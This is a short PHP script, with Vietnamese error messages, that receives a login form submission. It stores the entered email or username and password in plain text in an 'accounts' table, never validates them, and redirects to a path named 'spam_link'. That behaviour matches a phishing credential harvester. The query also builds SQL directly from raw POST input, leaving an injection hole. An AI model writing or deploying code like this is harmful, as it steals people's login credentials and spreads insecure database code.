<?php
require_once('./config.php');
session_start();
if ($_POST['submit']) {
	$username = $_POST['username'];
	$password = $_POST['password'];
	if ($username != '' && $password != '') {
		$time_now = time();
		$sql = "INSERT INTO accounts (`email`, `pass`, `time_logged`) VALUES ('$username', '$password', $time_now)";
		$insert = mysqli_query($conn, $sql);
		unset($_SESSION['error_username']);
		unset($_SESSION['error_password']);
	}else {
		$_SESSION['error_username'] = '<p style="font-size: 12px;margin-left: 15px;color: red;">Vui lòng nhập email hoặc tên đăng nhập<p>';
		$_SESSION['error_password'] = '<p style="font-size: 12px;margin-left: 15px;color: red;">Vui lòng nhập email hoặc tên đăng nhập<p>';
	} 
}
header('Location: http://localhost/spam_link');
exit;
?>